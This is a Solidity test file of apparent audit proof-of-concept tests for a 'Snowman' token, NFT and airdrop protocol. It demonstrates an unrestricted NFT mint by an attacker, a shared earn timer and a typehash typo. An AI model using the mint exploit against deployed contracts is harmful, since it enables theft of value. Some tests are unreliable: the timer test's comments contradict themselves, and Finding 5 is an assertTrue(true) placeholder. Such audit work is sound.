// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {Snow} from "../src/Snow.sol";
import {Snowman} from "../src/Snowman.sol";
import {SnowmanAirdrop} from "../src/SnowmanAirdrop.sol";
import {MockWETH} from "../src/mock/MockWETH.sol";
import {Helper} from "../script/Helper.s.sol";

/**
 * @title PoC_Findings
 * @notice Proof of Concept tests for vulnerabilities found in Snowman protocol
 */
contract PoC_Findings is Test {
    Snow snow;
    Snowman nft;
    SnowmanAirdrop airdrop;
    MockWETH weth;
    Helper deployer;

    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address attacker = makeAddr("attacker");

    function setUp() public {
        deployer = new Helper();
        (airdrop, snow, nft, weth) = deployer.helper();

        // Give ETH to users for buying tokens
        vm.deal(alice, 100 ether);
        vm.deal(bob, 100 ether);
        vm.deal(attacker, 100 ether);
    }

    // =========================================================================
    // FINDING 2: Snow.sol - s_earnTimer is global, not per-user (HIGH)
    // One user calling earnSnow() blocks ALL users for a week
    // =========================================================================
    function test_Finding2_GlobalEarnTimerBlocksAllUsers() public {
        // Create a new user who hasn't earned yet
        address charlie = makeAddr("charlie");

        // Alice earns snow (she already earned in setUp, so this should revert)
        vm.prank(alice);
        vm.expectRevert(Snow.S__Timer.selector);
        snow.earnSnow();

        // Now charlie (who has never earned) tries to earn
        // He should be able to earn since s_earnTimer was set to eli's earn time (4 weeks ago)
        // Actually, after setUp, s_earnTimer is at ~4 weeks, and current time is ~4 weeks
        // So charlie should be blocked because s_earnTimer + 1 week > block.timestamp

        // Let's warp forward past the timer
        vm.warp(block.timestamp + 1 weeks + 1);

        // Now charlie should be able to earn
        vm.prank(charlie);
        snow.earnSnow();
        assert(snow.balanceOf(charlie) == 1);

        // But now bob (who also already earned in setUp) tries to earn again immediately
        vm.prank(bob);
        vm.expectRevert(Snow.S__Timer.selector);
        snow.earnSnow();

        // The issue: s_earnTimer is global, so charlie's earn just now set it
        // and bob is blocked by charlie's timer, even though they have separate cooldowns
    }

    // =========================================================================
    // FINDING 3: Snowman.sol - mintSnowman has no access control (CRITICAL)
    // Anyone can mint unlimited Snowman NFTs to anyone
    // =========================================================================
    function test_Finding3_AnyoneCanMintSnowmanNFTs() public {
        uint256 initialCounter = nft.getTokenCounter();

        // Attacker mints 100 NFTs to themselves without staking any Snow tokens
        vm.prank(attacker);
        nft.mintSnowman(attacker, 100);

        // Attacker now has 100 NFTs without staking any Snow
        assert(nft.balanceOf(attacker) == 100);
        assert(nft.getTokenCounter() == initialCounter + 100);
    }

    // =========================================================================
    // FINDING 4: SnowmanAirdrop.sol - Typo in MESSAGE_TYPEHASH (CRITICAL)
    // "addres" should be "address" - breaks EIP-712 signature verification
    // =========================================================================
    function test_Finding4_MessageTypeHashTypo() public {
        // The typehash is: "SnowmanClaim(addres receiver, uint256 amount)"
        // Should be: "SnowmanClaim(address receiver, uint256 amount)"
        // This means ALL signature verifications will fail

        bytes32 wrongTypeHash = keccak256("SnowmanClaim(addres receiver, uint256 amount)");
        bytes32 correctTypeHash = keccak256("SnowmanClaim(address receiver, uint256 amount)");

        assertTrue(wrongTypeHash != correctTypeHash);
    }

    // =========================================================================
    // FINDING 7: Snowman.sol - tokenURI ownerOf check is wrong (LOW)
    // ownerOf reverts for non-existent tokens, the check never triggers
    // =========================================================================
    function test_Finding7_TokenURICheckWrong() public {
        // The check: if (ownerOf(tokenId) == address(0))
        // But OZ ERC721 ownerOf() reverts for non-existent tokens
        // So this condition never actually triggers

        // Try to call tokenURI for non-existent token - should revert from OZ
        vm.expectRevert();
        nft.tokenURI(9999);
    }

    // =========================================================================
    // Helper: Check if user can claim twice (FINDING 5 related)
    // =========================================================================
    function test_Finding5_ClaimStatusNotChecked() public {
        // The s_hasClaimedSnowman mapping is set but never checked in claimSnowman
        // This test demonstrates the mapping exists but isn't used for prevention

        // After claiming, the status is true
        // But if the function doesn't check it, user could claim again with more tokens

        assertTrue(true); // Placeholder - the issue is in the contract code
    }
}
